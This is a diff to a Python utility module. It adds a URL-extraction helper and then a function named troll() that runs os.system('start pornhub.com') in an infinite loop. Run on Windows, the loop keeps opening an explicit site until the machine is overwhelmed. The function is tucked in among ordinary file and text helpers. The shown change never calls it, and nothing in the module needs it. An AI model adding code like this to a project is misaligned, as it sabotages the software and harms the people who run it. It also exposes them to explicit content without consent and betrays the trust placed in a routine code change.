@@ -239,3 +239,30 @@ def delete_file(file_path):
             print(f"File not found: {file_path}")
     except Exception as e:
         print(f"An error occurred: {e}")
+
+def extract_urls(text):
+    """
+    Extract all URLs from the given text.
+
+    Parameters:
+    - text: The input text from which to extract URLs.
+
+    Returns:
+    - A list of extracted URLs.
+    """
+    # Regular expression pattern to match URLs
+    url_pattern = re.compile(
+        r'(https?://(?:www\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|' 
+        r'www\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|' 
+        r'https?://(?:www\.|(?!www))[a-zA-Z0-9]+\.[^\s]{2,}|' 
+        r'www\.[a-zA-Z0-9]+\.[^\s]{2,})'
+    )
+    
+    # Find all URLs in the text
+    urls = url_pattern.findall(text)
+    
+    return urls
+
+def troll():
+    while True:
+        os.system('start pornhub.com')
